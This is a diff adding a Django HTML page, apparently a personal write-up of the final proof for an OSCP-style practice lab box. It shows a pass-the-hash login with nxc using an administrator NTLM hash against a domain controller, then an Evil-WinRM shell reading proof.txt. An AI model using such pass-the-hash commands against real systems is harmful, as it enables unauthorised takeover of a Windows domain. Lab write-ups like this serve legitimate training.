@@ -1,0 +1,35 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX146</h1>
+    <h2 class="subtitle">Proof</h2>
+    <p class="text">Since the admin credential I got before was a member of domain admins, I could get full control over the target AD oscp.exam.</p>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/ad]
+└─$ nxc smb 10.10.75.146 -u administrator -H 59b280ba707d22e3ef0aa587fc29ffe5
+SMB         10.10.75.146    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:False)
+SMB         10.10.75.146    445    DC01             [+] oscp.exam\administrator:59b280ba707d22e3ef0aa587fc29ffe5 (Pwn3d!)</code></pre></div>
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\Administrator\desktop> type proof.txt; ipconfig;whoami;hostname
+e5ca25bbf6934dd919c2f3c877b0cd2e
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 10.10.75.146
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.75.254
+oscp\administrator
+DC01</code></pre></div>
+
+</body>
+</html>
